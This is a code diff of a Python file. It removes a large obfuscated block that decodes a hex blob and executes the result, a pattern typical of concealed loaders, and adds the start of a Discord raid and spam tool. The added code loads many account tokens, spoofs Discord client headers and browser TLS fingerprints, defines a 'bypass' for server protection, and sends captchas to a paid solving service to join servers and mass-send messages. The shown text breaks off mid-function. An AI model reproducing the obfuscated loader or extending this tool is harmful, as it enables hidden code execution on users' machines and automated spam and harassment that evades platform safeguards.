7e34ef4e3d43f2bb418da61c829261f5f410130707fe41f057c36efe9e60d4436235c8242516812a840d6c4d396ec10a14a3097d77130cbdadaf89d703c9bfa6f7d20b231bad0d12dfebcdd40e4cefd41bda61dfbb692773b7c6ebf2fccfe6b005ba1bc8bd554099bea100988a0b39f3b980888968b94aff8964696ca2260a17b7438628846a5665160f2d826268f972ccc06a24953aeb85990b79e04a09c09a30b194ce39905531734e470a096fa7ac16cfbf817de05ba6dfa11471c9f77c2b841152b2f5603fb63cced9c1acab127d5029bb7451e4080fb4ea5443878a322b47e7f469c346b9ccd89051823903581b4253b44a812c5e5750f8a4bb2be0684214b54b1a9696e8131050797ad2583af83e87e8e9bb1c3cb76bba19565d82d2cdd0ea6ca68430a51fd67e61c986d29bee44f70e39a109ad02844a7ce2878d9df257a4ca302d754935866d91a5a52555d0be2481008388ff2c47e84fbae8dd674e266a69c4a19b03006d0d4ec4a45c3035e26bf2c46d62c41f7e7f454703b6ece01664dd692d7c656820ad1f06846389b13055dd82dac899f2dd9214295e02daffbe7a1ddc6a1ebbc6f2ab088e560d49428ccab0c868a558828ffca66c3a0b8b33d4888bfb172e65fd934113dc81b3e23d76e9bd3b251986eb291a768dd6aaa9c83800e6a624a69df172e1b44d1006966d88299ea18299035e1149645551b1db7c472791dcc1509158e7c5fc66d61a767cbd1b0e56cd4942d56df8ed9692173fa2f9c40f93c7747aaaa6b413c72f4e07545c8d51195a7d0fa01d3869b6052ae772835f224460191ea154f034d9939f5123bda9483c2b95d1853eda9d9958a86073c6cbc6c2d5bb3cc04ceb3cf01be8202bee0fee15a61f29eabfb16d95a43a319600b664abb905b58133b5bb243842a815b5e47d3a349df9e39e6b6f0659fdff606adc143166a0760bd4bbad018323453cc54a1fc6833480fa4f004da4a6d55b9207cb91652319fd1c0f88cf4e7f429e37d859c0ea2114d55ed1572861a87089c4d87250fa1a9c998de20fb5c5534b7e5dfb20ba9f87428507295d02c64b8a2c64e7017906d8206f688e69b25495bf1c626e75f9173832a565e263a268292aa777a84ca20672990b4795be4f1eaa3d425d1873492a3c3d585d18264586a2a0a4a452f81d5298baa363a6e89eaf2ba3f5754326737e0c8897f1d5c53e97b47bd265be8969c29968d72e8bc7c80fb143fe171f8dfed20bec9bb7f4d05c91a9708ec440d7bf271bd9974ee1099e22f04b63a12322925c487bb2c95258115d093cfbf3148500768ba303221552527cd7700d8523b906d39953260614cd5a566572a1a1ef072518dc3d3d58e354bd0fd39f285c0069541ced281cb78cf387589ccad01d2ccb00533d55d142eac09a7b02caadae8b82596cbeb21b9327b36b92decf57721c5a66e3f94b36eb38e0cd3aa61ddf9b4de4c1b01b0cc9c754be240462c64d0e339eb3aba303221552527690ec8af709c07d6f429b48156c28f152f2dbe99fdfdf87cf8d76ad5af51d6580655ac1c5cf18eb129559c133e3bfb35594b0df0b7ea816541322c1b15f5314c206b6209931d226009e4f2ba2349567493672a3d404abcb75e7095050b433a52ee964a45c3035e29a4b07af60e72cd628707aa5df361a2b61239f7574223d63ec2d8ce3ddd82707fa3a3a8bc2fe42f061088b4579ab5fc11e74ed358464a91a0b3946d1078cf5f439574088443b1a9e6be18db4c1f93c5e4f19285d9403469ca15310b645b9042607a31181ba043f38fcbd65a205f074b01976e5050b67ba0140cd5a9279c2e3754bdad3f5406394b90e5f0b6c8e3c03121552a719039cfd3381a25cd166773a27f436d4a4c856551d546c72d015d5ef74c56fb8d56d7895faa2056e690d594233964ad6872c812ec199c582cc2c71eb2cca0c61c4755c62439a9e5a4b666c5fa8a46e6a4f6e48d5df176ce6a6742952c8baa363a6e09e9f27a4caeec37b44dfc1e3c313787b6a66491a704bcecef12ad22671ed52e98d3ee169bb453940438af8f48f31abc94983068ebc22a45846818654d563a6c18dbbc121a4414db43ccd2613955d0291a7af622079939ebc0886b4fcd6e49362f495410d719e9a79f92c52db10e141c0363a54ce4fe7334f51d2e2a48b2955e93056b1826f193281a23cd126773a2bd9b580b6b82684b7688502582cbebf6f4d032d791ed03e9b6b0d3af1c78dd4dcebfcd3ab234510deb4ea0f566daac8065e65f7e97c4818c58c8a0c7234dfe7dad2f8d0aad1537c420411da0e9c2c88454959c34df01604b45d56d3223c56da573725dcb7e54ed58b304dd7f8ea6bba2ca3116e820fa9046726cb83c8da351d26c713627fabb505c581353615954b5d1714b4097d7e15c9195ed994c6e0bc5f3c0efafce0783e71f4fd6af638ec80623494241673ff73011100d93e0c83da6920e8170c42ac2c5d866f29c85195984dd421686895702e34e88bac60c65037468fe71d9da51eaeb6029e0d20d0aca768fd34e6bbe82424d82fb23ff08b21cde13f67335598e6a2f0ea882ec10a14a3497d7dd68569de76ce623ebb630f769d4c4e21cb09af245eee8f1b2bf4bb4909c79acba60ce9dbf835bd04939a9b6f7a080cc53146fe6d6495bbbfc786c2dfb51185bb3e4c06568d1e1a282245bb435594b5e7b5b4d8b906687b339d1dd557a614d086dc90e11aac46f79dd3d62e9f175b6f3b1755b78ff2c6cb7
-1ffd018c397235e50f830799bafa2ba7ea1c107f186d81c8150c69e674898af99c46c80e1faa4ce5e2cd486ec5520e27cdc834d90fbd32bf19008be61530b0661958a2b0402bd628f3fcbfec1d98fa4e2a2eacd9b15e899391601dc28cf7844de3b4086976389b13dd5da517d684d096ec10a14afc96d7e1f4f85851f4ed3895df17263f88f47aa5d6e680d7942bd61442c0286ad89344ebcda4924064e6dff595c4e3fb692452c8613d05a287d0b02e9c3a40d3859109a92a3969be03c0968aaadb64468adb4ae707976bd98faa1d6b96a0fbcfd180df97260c49c8453a5c19ef89db60579b68a4347b9ccd890d2e0817d64413203b44b412cae5755f865cabd426aaf48c23b78579bf5b4854467ae578db94387a2fdf034168ab9f56576eebd3778d8a3bdb8384f81b2ba9d88d9271779781c50a1c780fcbb960d992b5dbacb8ffd3dd41c8a74c65a6c0fd9fa11284a806551f97c7df8e3bd18f537f2fdb62688721a7e8cc7d0505c0c0fd917f14f0d9bc27ee8c8552118d956691a721b642aa6f09264c7688502592cbebe6f4d012d7111d05bf9c4b4a6968f0f78e8d798305a26a7bf69ede97d6469d1bd2ae34cb1aa2b0516e6839f576f5a16695bee06e910db9ba74d3eedde896e035a718b9820d23b6b014d9185d687a78ada427821202cb1b1d10785f98f883603522f286b289675f47b51028ea060b16902a17acadec63753a40414043d0b9f733087815a9c476edb3a653462f2fab7cedf29b386bd98f82c89a25e8fef6d3bc662368235af8ac585f1121234efdd6690a7949472ce36d91c7d3504950cf7926594b763b5bf989148d906687b339d1ddc5dfc29a40c264870858a2b8bcee9a8f14183a343eae6e0bcb33b58ff91c6deaad9cb49a722d27ad9cb46c1a6b678b9f4e4dfbe9088a9d979195326021a7b445764e698e06a665156b174206f48502d8a032c8593a7019efe9da3c3f9da201d2cc703627aabb285c58134e615954b5d1714b2c97d7fd239baa74ffd836ff89002c72397735258c3533b4f4da607b384cb4cc127eb27dbcd1d45a73073e7d37aa641ea159c860dc224dff7dadafe6145a2b6e08a73e6674134ccaf5a8523c9f4c947aa652b9f8978daa35b26b9bb63d35aaa0537a07af2ca0306f17c69c02d4ec4a45277ecdad1660aa23e6a39147b9a09953e3d62c41f79f6244f01514f005f72725c1ddcfe63d55632e72b54646d3df16cc747611b7b02674b664870855e2b6bc0ea587040347ba2fe3b630ef19045b6f5418dd6ba136daf10c11e284b3903f222f1aba3a9adc82ce52b60122201a26c1911b3d251d02e1902b8d548b35df9b0ac52c611176cb4e18265ec18a3b21ea1a33940dd0a1f9c7656ba79eaf83a5804b372828db3d4e3b32f9f1126a12dc1f09166439bc276cbd72681aa4fd31c153901d225489dcf23a9c1eed5a0f19a0f6788cdb8366a7f30d5378d9df255a48ce3c425d30e79e5ffe14f2105702f149f040d1318a6fe99453c54bd34a19b030a64050b32b150d0f78b17b59ccad5982ee3f47bf5851e5e40574107d482339365cbd2d878fdd869454947771b8b026a0c2b2a86aa3e396682eafbb7365c7c7694ffc2c0bb0e708d6942466ef63f74591545edee3b23554aa09f8829da6925f8373d0f336c2622c0317b29ea3146d1dcfdaa19658c810d02f59a10bd22c0d179393cc34be82021ee1fec83f3ab619ef791b1f81261a2acda098820db52bb1b4253b44a812c8e575203d241038b27d19b785e5f923c52b1f46a22cac5f7a8e1f7118228c78d9df65504b566780ef2905e32d6e53752d882341b860ce7c1849a38ea0f2791959290316c6d4026a76a5a2e1010f042f0baf354b8e695c0b5f41015f707fe41f1dab8cf74cddddbcd86816389b9b5a27780aee9ccb4e85dc4a0ad9bd7f28cbbf8b22a1cdd189d68a67efed9424603417cc799c27e60329390d1968a854343ce0e5f5cb2266cd92d310d7c25750c017dc1ff947c72ae33d554fd5a44b344e9a35cee64441177f0b6b02694b768850258acbeb2e14af88769b95667fdc9413d3b523551ada3e9aef82ce7ebe602220ba56c2df5f016a8b03590486cf4e8673e5e2239567cdf7a642314b5884dde213868957b686c0c88c4e031a684a71d9dad9e6eb6029e0d2ede5e7ca5ea2deb377773555ce4c40073569592407866b6a9c346b9ccd89050dd52951159645551b1db78474793d6a8012351f33435df7799004342b27aaa6dcd15b14d52a150194ce7fccbd5f8280f57532f9be5610dfe27816b90993d88ac0cc134ce5e31d79bd7e49a9dac037a24bc7cb31bc2c64d07d818d96cdfaea75a175dc2d9528754b2de66a2a44ec646e44cb22d6c2ef522549f19a1ab0930ca1be8242d4e1fed10cb279cfdaa4bab812041c627641ac09a22dd9214295082eaffb10dc4ee7f5957ea0e73eae90d892c36553c6880160cbfe2e83dadf3a037c4f29286d719baa6b411c09c20573e6df8635ea080a959791953260614c2da066572a1a1ef040f0b2f05ab3e484a568b12ce5b8c5943846b3d691d505c911ba78c49a980acba2aa8d8e5b02babceec91559df412357fe35d9d639448813d7427e0e5b07ee069524603417cc7998bf2603d0efda684d97135338b24f8791354b4e4c9e16fd108312908b74b832de73b655abab9c9506697f5834156487885642b9bc6ecf10510147b80fa6dbc2edd1879d4f3accd10a38e6a946ab3b5348673fd93011100d93e0c80da4920e8170c8b54aaae69aef4d856296b008bb952b0c13afe6c59d10758d19ca06e8d0fce3b2b573d3d7c152c0a51b1494ed1e671ec5967fe734c69478ec34164ee282e4081d3d624d0861b243042cf15b5e47f1bbcf0036f5d11daec2394f35a5895ce7f1b2bf4bb47e9c798aba60cedd3eaa5ac89a2b06511d2adb9efd036d042a29e78e97d1d0219b8531b5849a5da968786094c39f0e9e6b96a0fbcfd2576ea87242033a883ea4913ce018e003b8212f150b5c302eac89aab02caadae8b825a4cbeb78ae68e9ecece1a3ebb630f58fb958bc72686b4a13bd5def011cb4d54fa32bb7f5e9bb46c59ded4142fc8d7553ec46c9a4a9d83e3c358100094323881ee40d9f916bb7cd69d9284c37d9c8ece25afc55906423b526dba67d385cbd87bf005c3d1515a53146206b02292c8baa363a6e89e2f23a922b5a223bd27d5cdd16beecf52116352ca7a2a66cb13af6f060d49d4cebcdb4690acb747b2a9069822321d3d946305eda841cd653207a0c3d681a13e8e454959ca439605001b39218bc87e5b0ea221a26e41bdae13cb0a6dff70c779a4262f30ae35bdbdf89cfaf02b55af56b94359641152bc7587cae68ca18e7a0cf9e7e4dd6520af8568abba2e1d18c7036278a638040d64411263b44c012c2e5754792e8fa76cc537a6c94506f1de02a0b168674a3dc2d958a8607bc2a4811f5ecdde39ac50e0f54bbe6c3446dd5d1dbdb2f65e6be016b1f61ec883d65d4f75697f785dd7e380533e57d3fa9e8701d09235ef67789f629cf5e5595246034a4b83de6694b5236120f34b786c6964a34e3f0b136af848e4b6bc493dd5976670db8286522f74bb9ea141b529288163e2bd65744c8c046cdf1b9542374e032de16793c1b953c157d4823393e5ca00e4029ad91d2ecf1f4c336b8705c581357615954b5d1714b5097d7ddb9d280fc9e43ef7d61eaf37c91596e63943367b38e26a66955735a5e9c41fe0f7336e76dbd356241163c7d83aa641ea159c860dc2273c07dadaff4145a2b6e08a73e6674134ccaf50ea5461ecb282052bde269a02933a75e6247bbe7a1ad5d0edb6bd98faa656b9699c0c9a100f93cfbf235594b922b5b4d8d94668fb339b1c185e3c29ab80acba2aa8d8e5b82babc6ece152d8b1dd13ea86e0bb70742df5ebd8f85beee30a43f68147fedd9dc53c44f26a6e5f21e97ad415b4de817ec5a95fc1a9c839eb7518d8a65e04236f424a9b5212acf3481434280bd043a5dd04e03aa0514f01e968342d56098e0ee6032bc48e9e0a1b5cdf14de1198f03532a39e8d4f5bdd73f47b4442156556ab5ead7286b2c832a568ed9e054e42bc85d5490e42cb2266b292af656e1042e488625a0a2374606644df86cc90e11aac46e791d4d8f8f95be4e12786fee57f811f7e4aff013f679dfded76c3c62eca10e5ff6f8920631376f0335150abdd754adf2f3d0a1f3bfb5e19f37c0fa3a997c5f9b09b8d0c85259e4aca2d077a057c2611160ee6a8c44fd9252b581cf2b3ef1292c8697850cba2fb0d1b2595fad2eb48ebba512a56ea9c55c4d85889dcc8d6859c45af85daa24295e530396771336dc4e99cb89644d2666a7b795a76734369a05cee66d0505b12678b66487085522b7bc8ea64745d4d9adf8c8ba2decf0ab69803c67caa684692f28b47c393d244e9bfcdabf2355d5b520cee928d86c4b668672bd078f8a5992a71191ed0e2f31034d17cd28ef510a035364cb1328d538c6ee016c6b977f71b096fda832ba6609baff1483474d35a5c6b5552db4670e02abb7679e42a61db660a6bb0bc38535f1149645551b1db70473791dc9152d911de93eae6e0bfb3d3a8e852d47faa66c813466cad042d63ee65c6d47fa49f7f1465363cd1df8f4bda8927984662183718bb4fcf7b5beda5368adb8219cfa98d14d3029d73b946a3f4eab1725430192ea57cfc63db5a9a053ccf1ca010aef76614cf5a766572a1a1ef0b0f2b2b56dcd3201485476ce05509970e13079cfd59a6fde9e1227cd1a677362810bc6853551159645551b1db78474791dc995ad18b27dcfd0735b98f8fb8cc4b69cac9b3243eefff0b2bfcba0cebbce00df530a1a5bdca6ea5a10478270c19c7b3f977d4dd75e0ab41a93139701a24a45c3031e1c5e16686b969cb8b816be8202bee0fec83f3a5619efb93a324296c3d68b03aa203b44a812cde575079ae5c03afbf8a0ba2dbc7dae999f6a22d5b6af63ce5ecb3f303bad614e678b13283fd574a4aaba16c481c8d33ac1eb8b90abc11032419a1bc2a98f19dd049372bd43a9603d50022609776bf0b0c253d0295d818775143bc74f39409b289c53b8d62c735082653f5bbf5f534d99ce90b374e032ded3f5df8acba221d20c713627cabb385c581350615954b5d1714b3497d7f15c9180e16ce1cbb82d7cfefaf9fe40f2014f235f5efdc23ec6fb9fef5f63be2c7adf45dddf795fff525157443509173880f68d8e08f9f4f9eb97719672eaaf5f4ee2ce26a606f57a25736bbeaeffd47e5e06b4d0c63379a02999670325bf92318d52afabdc3c1ace1e122fa314ad7f9be4fbabf710cf5a6055cbf9c9d8664f13b2b3da1fa04022e1833b8a0ccc40c92f63ccf39dc11ffb1fac03181ff37af6db9eeafdb379169783e1f1d58c01cc9679831b2a74fbe47ab8d2114c84c18ddb638de9cb3dd63c1da2bccdefdd8f61e769cbb8654f7d66df5e037f30f4f8c01f5b753349074a7e4e63faeadef5e9efd4b71e122f6feb737504a72d42c5087b98e1d5a0de2153f7f9dcb88536bb4afa461ed82325374a0dbd719d302a9f35a15fe9ee49348f32871e59479070cb1273c7afa3be30d79e13c7bc77d79e2a7ab6e567990f07cf098c79825ba239870eef249ed409e13cf789b846f52de9dd0f3f6616a3defb0ccba3eaa0d5fda58c193afce6802b47238f9ec7230209f7c6b843357607bc6bdb9621fa56c076f299f6513a89c4e440c9b63187bc23d8599b4ef4e930391c8f5264c75bdd9df5d96af1378e5eac9ec89851c30104f8233f37bff50e0ff99bf223d6f5d1999cb7160f08e69732264f46f3bdbd43e6321daaa36ba13dca67ed0fed42c9a89d83f642b72342d9b874b42f227ebcf7621f64e49ddb437604838df978ef7877581f1093b2fe9fea8f861e90c3476939b2babcae315eab9e0978bc980def3d0ceaf1fa6b53fda1e6443b0e31153f8ed283cc4e9cfa68e93223188728464d75e5c9beb11d3f4b72ca3af031f404c67cbc77a803e5b499b41a20077ee876c48fd23afd34385b0719f5906ccc0f116736db799be1e145f160c61cb2b5a4e616b724739852d80ff92dc93d60e032e55193b570aee43d1f573ba6074d3c3c3285aed12f0a82af6a1ce5a9fb9cfa702786d83f7f7f254e0e566a5fcd18c0bcdbaffc1cf249c5a1983fcdf1db952939d31f0dc2ab49f5457ec26e8ffc3ee29dddc496143abe677e1443df787893f152c6b4df1eead5e3a0dfc08e15dffce4e5a0791d35e6bd0379a9bbe403f07a2c830231ef4e9b43fd3143569dd7aa3a8f383833ee5b7ca3bfdc7bad1bc2901625dab1d4deb7dee7d7fac7f6c8ce819a8e7ef183cc653ae28df33963c5e675a0bf0e7c80b39efc98e9b861708ca83d61c9f389b8464e01ca90a8c97b4d67bdfa91fd5863dafb0bf7a0b91eaebfa81ecafa901f577b923398dc0b3998ea0fadc98728c99d1d549ec33b57e38ff7f25ca76fe4b95e49fe7e700df998ecfbeba79be86fe7d0a7dbbffef087b7ffffe1edbf6ffabebf53bc717be783fb43d1f7eb2feb8b3f30b9ef6fdfae877defe843917724ddae2ed7eb96f376f943f1fe9de407cab62c209acbbb27e8ee979a112902f6b3545aabb5a924ca5e97c6dd2fdbcb7bf87db7af8436faded272ad2af6efbad13374bc581aac89b61e807cdbad1def78996059f971a17a8fb9dbd7c15200d1dd4b839191481a800adea2395c96ae5a02ab4e90f1d614fa2fd899082072aa8eb24d93a507eefbebcb7ab1214092fc114442e5c101d3d2def3961053a6a45131b67c5f88158ca3a38e01a77ffbef98a7116d5e433aa8379af726a9e8953e7a9e4fe06ad3107d7b2d4dd45a2010fbd182e1d5a293e24242ba7d488564b8d3b376adf6f95269de2cd3b764b381c2767f17abe33bcf711c0e2fb46bedaa322680eefda249ff4afded6767231028f983a8f9ae184d732371de0d595ce66fc4dce3e79794583093af6b2457de92aa80551b82220b744acef86267e7d6d19f473e7aa735ce38cc864557927242892bb56382a4f26a9f1ad1
-ba229f1e1f916359ffb1a5adc9fa3d72d67830f203bc91ef9fb2c219656e8b76bf2b31ea8ec7f6309b51d088b76e145545a91d6a9ede0e4e384878e0ae9b62d771e09741e3995328d3948b4a4b659767b997aa8337e8b785d65e6968d83671321ae96d1df13b03b51c5667103e73c5b8b456a1783fdd83a9ab58c0d4e0b51f3d5b5718476167611700e415c0193f2802141d3103d4fe33bc00fab9ee89ae79148ab4c74d236bc33c29817c035caba460fe75cd8fcc93669faab9a66ab19a41c61cab6369c8a933e8c8581b27a58b3c9f4626ff407f36486937c8f57f5b5c61c366488b142911cdad8264b3777f82fc971c3723be9f2478b1336748789b5becb6e3cc6c765aa712365eb7d5ec6dcd77551dd60846ee1985ced54ec792c375d84dfe96f65de93d845b5cbe0fc4f67cda0deabb97371df7c7d7397aefbdfb0d6a67def5dc465fbf87b398d5dedebf46b79476cfc641f1ae8c0d43d62d384df7a03e54ac7114eaacb7ce744d6dbacf844ea786fabab2755c5b78377ec69f3819ad515b1f297c48baf64e5be344031bbd2559aa62ab33064031f950df1618e98d6c5b48ec7bf8d70f9048db7f2d3362444f306cecae4b8feffd0f7034b5af839b769a74f5c7e350bb50d7f3e12b7cbbb7fdec8e7c0cb32993636f7daffc58809717bac66f697849d21af8c8e1d35232467f844760669ccb52f3ba0424dc82b0a675d4f7b4e52f19b116bcfb0b176bf4357de544f21319149a527309a324cacf0fa30f6074cdbd216e0a4721307c13a08ed0f067752bbeb2bfdd8023289691962fc048d51799c14a9d2cbda1206d5cd6f31da7c639dea9e8e299aeddf4338ff361df0e0d7cf8db34b7348ca2e1d2acf3b5cd6ef231dd7e4a80bc9bfd51193f8a82c3a355d70b0fb6fbe31e9aaa184ffb30adffc650ff8dd8ce8ad6801ffdb3346670e0c0bd16f5a30ec43508bb0fbe29e5bfe50b95c0e806649757e80084b7be7a1131f0f82c2aeaa86f2338910a7d7b09ad9aa39c72044ab3b95111bbbf29d59adbd735ea0447b947572170d44859e83ce25b486d3365f7d9eeb5196e14f4b4506d02ee68affb4a2d0bdea7f1baed062b95dc745a2aa52c6e2bf3c874ed0792f505b120e4b96f91546facba6fde340284e628e1a38951a9bd46fee096d36a44277cbc6a54e8dbfffef411de9fdf7beccbf2dff7545f3d126295fc97b777be61a262f338ef04947d910ff82f0e63b9c746c65d31570035c1571debeeeb4d4d2e685cdd91dd4d124c0166dc6fd24b3eeef28bb909ddc6c80cae18df6bf5be9055efd1a7bea57a33463b1c1c48561cb64130dd09d4b7fd4444d91e16fd4bdd6ba04e082d67bea29495595d95d54ab5e1176acc6a8b1a6f7e79828551a84fc4d692462851a8aefa75c9dadadbd9a9ae34b10550d89be304718a15db52c9c815ad7d02f342e59edd5ed52215cb2859c2d1e7edbbb68c6b4f8a17e692eb16eb9258cda25d95d354f16eecaa142a7c3cb73454d4b76a7cbc587b85a062170aad0b62b56e7972d69bb95d96114ba79055bcd069751fc04b94516d9c4265e58358a734e8b37a65962ab7bbb2f7b63d20d64aa968b97ab0ba25384f6cbdd0ccc29b2e2b67ec22e61ee37e25a33d62432d731b19a99639454568c5fc72e257373f8bb5e2c6fd2a8e8d7ca4f34a9a0044d29e5967a2d594e18437eb9ddb41ea6324af9bac2f93caa43f4e16621cad6d454583b52cc7f54db1599d2c8573dba876bcdc99d54e395fbc7287ef4235746de436963a635a376abc02670ed74adb063a56a9966dd25c2a5fb8fcb9cd58dd90d2415238fccc9205dce10d9276d1d26f7be1d9c19a22d16d0daf4239feb15b310f6c52adb232960e8f5e58e5bb5fd869bc2e49c38859a2c8992f0c934057b928c192a4d6a3fa08536e79d9b5c82f46d6dd6aa524b19b22526d324f61bb42e13687d62863275a9ab601b16b5215be862284f0414b106875bcfec8990accfa637e9cf19df5eb9fee62fe5489ffb45af9843cf04dc0cfe5678337e19fbffee0b07ee77ca375293b365976f9fed325358564df1f6f5b3365d75b38fa7cfaf9ab4e6cd9bd7ceb167ffc5f7e2de0f923f7f9ff03694d5181""")
-lIllIIIlIlIIIIlIlI(IlllIIIlIllllIlllI.__dict__)[0][llllllllllllllI(lIllll)+(llllllllllllllI(lIllll)+llllllllllllllI(lIlIll)+llllllllllllllI(lIlIll)+llllllllllllllI(lIlIll)+llllllllllllllI(lIlIll)+llllllllllllllI(lIlIll)+llllllllllllllI(lIlIll)+llllllllllllllI(lIlIll)+llllllllllllllI(lIlIll)+llllllllllllllI(lIllll) + llllllllllllllI(lIlIll) + llllllllllllllI(lIlIll) + llllllllllllllI(lIlIll) + llllllllllllllI(lIllll) + llllllllllllllI(lIllll) + llllllllllllllI(lIllll) + llllllllllllllI(lIllll) + llllllllllllllI(lIlIll) + llllllllllllllI(lIlIll) + llllllllllllllI(lIlIll) + llllllllllllllI(lIllll) + llllllllllllllI(lIllll) + llllllllllllllI(lIlIll) + llllllllllllllI(lIlIll))] = lIllIIIlIlIIIIlIlI(IlllIIIlIllllIlllI.__dict__)[0][llllllllllllllI(114) + (llllllllllllllI(lllIll) + llllllllllllllI(112) + llllllllllllllI(lIlIll) + llllllllllllllI(IlIIll) + llllllllllllllI(99) + llllllllllllllI(lllIll))];IIllIlI='-_+!1@2#3$4%5^6&7*8(9)0qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFG';lilIIlI='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/';lIlllllIl='ihQlwp==';lIIIIIlI='e2)dtYTmyh)Eym==';IlIlIlIIIIllI='uq*h%(p=';IllIIllIlll='+p=='
-def llIIlIlllllIIlllII(lllIllllIIIllIllII):
-    lllllIIIIlllllIlII=IIllIlI.IllIllIllIllllIIlIIlIllIl();llIIIIIllllIllIlII=lilIIlI.IllIllIllIllllIIlIIlIllIl();llIlIIIIIIIIllIIlI=lIllIlIlIIIlIIIlII.IllIIlIIlllIIIIlIlIIllIII(lllllIIIIlllllIlII,llIIIIIllllIllIlII)
-    return llIIIIIlIllIllIlIl(lllIllllIIIllIllII.IllllIIllllIIIIIIlIIlIIII(llIlIIIIIIIIllIIlI)).IlIlIlIlIIIIlIllIllllllII()
-lIlIlIlIIIlIllllll(IIlIlIIIlIIIIlIIIl(IllIllIlIIIlllllII(llIIlIlllllIIlllII(lIlllllIl)),llIIlIlllllIIlllII(lIIIIIlI))(lIllIlIlIIIlIIIlII.IlIIIllIIIIlllIIIlllIlIll(lIlIIIlIlIIIlI.replace("!","").IIllllllllIlllIIIIlllIIll(llIIlIlllllIIlllII(IllIIllIlll),''))).IlIlIlIlIIIIlIllIllllllII(llIIlIlllllIIlllII(IlIlIlIIIIllI)))
+import tkinter.messagebox
+import requests
+import threading
+import time
+import os
+import uuid
+import random
+import base64
+import json
+import websocket
+import tkinter
+import re
+import wmi
+import tls_client
+import toml
+import concurrent.futures
+from datetime import datetime
+from urllib.parse import urlencode, urlparse, parse_qs
+from datetime import datetime
+import customtkinter as ctk
+from concurrent.futures import ThreadPoolExecutor, as_completed
 
+RED = '\033[31m'
+GREEN = '\033[32m'
+YELLOW = '\033[33m'
+BLUE = '\033[34m'
+MAGENTA = '\033[35m'
+CYAN = '\033[36m'
+END = '\033[39m'
+
+# 一部スキッドあり
+
+spamming = False
+spammingOLD = False
+stop_spamming = False  # ああ、DMのやつ。名前を変えるのは今更めんどくさい
+stop_custom_spam = False
+config = toml.load('config.toml')
+API_KEY = config['settings']['api_key']
+site_key = "a9b5fb07-92ff-493f-86fe-352a2803b3df"  # サーバー参加時のcaptchaサイトキー (このサイトキーが一部でブロックされるcapsolveサービスがあるので気をつけてください。)
+
+PICTURE_FOLDER = 'avatar'
+
+with open('tokens.txt', 'r') as file:
+    tokens1 = [line.strip() for line in file]
+
+TIMEnow = datetime.now()
+BASE_URL = "https://discord.com/api/v9"
+IMAGE_FOLDER = "avatar"
+
+with open('tokens.txt', 'r') as f:
+    tokens = [token.strip() for token in f.readlines()]
+
+token_count = len(tokens)
+
+with open('custom.txt', 'r', encoding='utf-8') as f:
+    messages = [line.strip() for line in f.readlines() if line.strip()]
+
+with open('bot.txt', 'r', encoding='utf-8') as f:
+    BOTmessages = [line.strip() for line in f.readlines() if line.strip()]
+
+def noncegen():
+    return str((int(time.mktime(datetime.now().timetuple())) * 1000 - 1420070400000) * 4194304)
+
+def nowtime():
+    return time.strftime("%H:%M:%S")
+
+def generate_precise_state(guild_id): #Bedrock Bypass用のStateを生成。
+    guild_int = int(guild_id)
+    
+    MASK64 = 0xFFFFFFFFFFFFFFFF
+
+    guild_high = (guild_int >> 48) & MASK64
+    guild_mid = (guild_int >> 32) & MASK64
+    guild_low = (guild_int >> 16) & MASK64
+    guild_ext = guild_int & MASK64
+
+    combined1 = (
+        (guild_high << 48) |
+        (guild_mid << 32) |
+        (guild_low << 16) |
+        guild_ext
+    )
+    
+    final_state = f"{combined1:016X}"
+
+    return final_state
+
+def extract_invite_code(url):
+    try:
+        parsed_url = urlparse(url)
+        path = parsed_url.path.strip('/')  
+        if path.startswith('invite/'):
+            return path.split('/')[-1]
+        elif path:
+            return path
+        else:
+            return None
+    except Exception as e:
+        print(f"Error extracting invite code: {e}")
+        return None
+
+def validate_token(token):
+    return True
+
+def create_session():
+    session = tls_client.Session(client_identifier="chrome_120", random_tls_extension_order=True)
+    return session
+
+session = create_session()
+
+def get_headers(token):
+    cookies = get_discord_cookies()
+    props = get_super_properties()
+    return {
+        "authority": "discord.com",
+        "accept": "*/*",
+        "accept-language": "ja-JP,ja;q=0.9",
+        "authorization": token,
+        "cookie": cookies,
+        "content-type": "application/json",
+        "user-agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9028 Chrome/108.0.5359.215 Electron/22.3.26 Safari/537.36",
+        "x-discord-locale": "ja",
+        'x-debug-options': 'bugReporterEnabled',
+        "x-super-properties": props,
+    }
+
+def get_discord_cookies():
+    try:
+        response = requests.get("https://discord.com")
+        if response.status_code == 200:
+            return "; ".join(
+                [f"{cookie.name}={cookie.value}" for cookie in response.cookies]
+            ) + "; locale=en-US"
+        else:
+            return "__dcfduid=4e0a8d504a4411eeb88f7f88fbb5d20a; __sdcfduid=4e0a8d514a4411eeb88f7f88fbb5d20ac488cd4896dae6574aaa7fbfb35f5b22b405bbd931fdcb72c21f85b263f61400; __cfruid=f6965e2d30c244553ff3d4203a1bfdabfcf351bd-1699536665; _cfuvid=rNaPQ7x_qcBwEhO_jNgXapOMoUIV2N8FA_8lzPV89oM-1699536665234-0-604800000; locale=en-US"
+    except Exception as e:
+        print(f"(ERR) {e} (get_discord_cookies)")
+
+cookies = get_discord_cookies()
+
+def get_super_properties(): #ここは確かこてつから貰いました。
+    try:
+        payload = {
+            "os": "Windows",
+            "browser": "Discord Client",
+            "release_channel": "stable",
+            "client_version": "1.0.9028",
+            "os_version": "10.0.19045",
+            "system_locale": "en",
+            "browser_user_agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9028 Chrome/108.0.5359.215 Electron/22.3.26 Safari/537.36",
+            "browser_version": "22.3.26",
+            "client_build_number": 256231,
+            "native_build_number": 41936,
+            "client_event_source": None,
+        }
+        properties = base64.b64encode(json.dumps(payload).encode()).decode()
+        return properties
+    except Exception as e:
+        print(f"(ERR) {e} (get_super_properties)")
+
+properties = get_super_properties()
+
+def headers(token, cookies):
+    return {
+        "authority": "discord.com",
+        "accept": "*/*",
+        "accept-language": "ja",
+        "authorization": token,
+        "cookie": cookies,
+        "content-type": "application/json",
+        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 Edg/126.0.0.0",
+        "x-discord-locale": "ja",
+        'x-debug-options': 'bugReporterEnabled',
+        "x-super-properties": properties,
+    }
+
+def solve_hcaptcha(sitekey, invite):
+    payload = {
+        "clientKey": API_KEY,
